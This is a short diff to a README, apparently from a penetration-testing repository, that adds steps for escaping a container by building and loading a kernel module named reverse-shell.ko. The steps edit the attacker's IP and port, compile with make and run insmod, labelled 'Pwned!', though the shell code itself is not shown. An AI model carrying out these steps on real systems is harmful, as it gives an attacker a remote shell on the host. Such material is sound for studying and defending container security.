@@ -8,16 +8,20 @@
 
     nano Makefile
 
+List modules within the container to be safe, then copy the module name in the Makefile before running make. (Do not forget to use TAB instead of 8 spaces.)
+
+    ls -la /lib/modules
+
 #### 2) Create a reverse-shell.c (Edit your IP and port accordingly)
 
     nano reverse-shell.c
 
-#### 3) 
+#### 3) Compile
 
-    Make
+    make
 
-#### 4) 
+#### 4) Pwned!
 
-    insmod reverse-shell.ko (Pwned!)
+    insmod reverse-shell.ko 
 
-### Scripts will be added in this repository under scripts folder
+### Scripts are added in this repository under the scripts folder
